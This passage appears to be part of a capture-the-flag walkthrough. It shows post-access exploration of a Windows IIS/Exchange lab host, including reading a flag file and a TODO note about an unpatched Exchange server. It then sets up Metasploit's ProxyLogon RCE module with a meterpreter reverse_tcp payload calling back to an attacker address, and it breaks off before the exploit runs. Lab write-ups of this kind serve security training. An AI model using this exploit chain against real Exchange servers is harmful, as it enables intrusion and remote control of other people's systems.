-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
-a----        1/25/2023  12:12 PM         169984 XPath.dll   

PS C:\windows\system32\inetsrv> cd c:/
```
```text
- PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  11:44 AM                934484d0a9de05fc41a4dc84                                              
d-----        1/26/2023  10:36 AM                ExchangeSetupLogs                                                     
d-----        1/25/2023  12:12 PM                inetpub                                                               
d-----        9/15/2018  12:19 AM                PerfLogs                                                              
d-r---        2/28/2023   2:23 PM                Program Files                                                         
d-----        1/25/2023  11:41 AM                Program Files (x86)                                                   
d-----        1/25/2023   1:34 PM                root                                                                  
d-r---        1/26/2023   1:16 PM                Users                                                                 
d-----        3/29/2023   2:34 AM                Windows                                                               
-a----         4/7/2023   8:57 AM             31 BitlockerActiveMonitoringLogs
```
```text
- PS C:\> cd Users
PS C:\Users> dir

    Directory: C:\Users

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  12:54 PM                .NET v4.5                                                             
d-----        1/25/2023  12:54 PM                .NET v4.5 Classic                                                     
d-----        3/21/2023  11:40 AM                Administrator                                                         
d-----        2/21/2023  12:31 AM                dev                                                                   
d-r---        1/25/2023   8:15 PM                Public                                                                

PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir
PS C:\Users\Administrator> dir -h
PS C:\Users\Administrator> dir /a:h
PS C:\Users\Administrator> cd ..
PS C:\Users> cd dev
PS C:\Users\dev> dir 

    Directory: C:\Users\dev

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/26/2023   1:16 PM                3D Objects                                                            
d-r---        1/26/2023   1:16 PM                Contacts                                                              
d-r---        2/12/2023  11:54 AM                Desktop                                                               
d-r---        1/26/2023   1:16 PM                Documents                                                             
d-r---        1/26/2023   1:16 PM                Downloads                                                             
d-r---        1/26/2023   1:16 PM                Favorites                                                             
d-r---        1/26/2023   1:16 PM                Links                                                                 
d-r---        1/26/2023   1:16 PM                Music                                                                 
d-r---        1/26/2023   1:16 PM                Pictures                                                              
d-r---        1/26/2023   1:16 PM                Saved Games                                                           
d-r---        1/26/2023   1:16 PM                Searches                                                              
d-r---        1/26/2023   1:16 PM                Videos                                                                

PS C:\Users\dev> cd Desktop
PS C:\Users\dev\Desktop> dir

    Directory: C:\Users\dev\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/21/2023  12:28 PM            512 TODO.txt                                                              
-a----        2/12/2023  11:53 AM             29 user.txt                                                              

PS C:\Users\dev\Desktop> type user.txt
THM{Stop_Reading_Start_Doing}
PS C:\Users\dev\Desktop> type TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]

When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local

Install the Security Update for MS Exchange

┌──(witty㉿kali)-[~/Downloads/maigret]
└─$ msfconsole -q
```
```text
- msf6 > search microsoft exchange

Matching Modules
================
```
```text
- #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   0   exploit/windows/http/exchange_ecp_viewstate                          excellent  Yes    Exchange Control Panel ViewState Deserialization
   1   auxiliary/scanner/http/exchange_web_server_pushsubscription          normal     No     Microsoft Exchange Privilege Escalation Exploit
   2   auxiliary/gather/exchange_proxylogon_collector                       normal     No     Microsoft Exchange ProxyLogon Collector
   3   exploit/windows/http/exchange_proxylogon_rce                         excellent  Yes    Microsoft Exchange ProxyLogon RCE
   4   auxiliary/scanner/http/exchange_proxylogon                           normal     No     Microsoft Exchange ProxyLogon Scanner
   5   exploit/windows/http/exchange_proxynotshell_rce                      excellent  Yes    Microsoft Exchange ProxyNotShell RCE
   6   exploit/windows/http/exchange_proxyshell_rce                         excellent  Yes    Microsoft Exchange ProxyShell RCE
   7   exploit/windows/http/exchange_chainedserializationbinder_rce         excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
   8   exploit/windows/http/exchange_ecp_dlp_policy                         excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
   10  auxiliary/gather/office365userenum                                   normal     No     Office 365 User Enumeration
   11  auxiliary/scanner/http/owa_iis_internal_ip                           normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes

Interact with a module by name or index. For example info 12, use 12 or use post/windows/gather/exchange
```
```text
- msf6 > use 3
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```
```text
- msf6 exploit(windows/http/exchange_proxylogon_rce) > show options

Module options (exploit/windows/http/exchange_proxylogon_rce):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   EMAIL                              yes       A known email address for this organization
   METHOD            POST             yes       HTTP Method to use for the check (Accepted: GET, POST)
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   SSL               true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
   VHOST                              no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.19.103      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
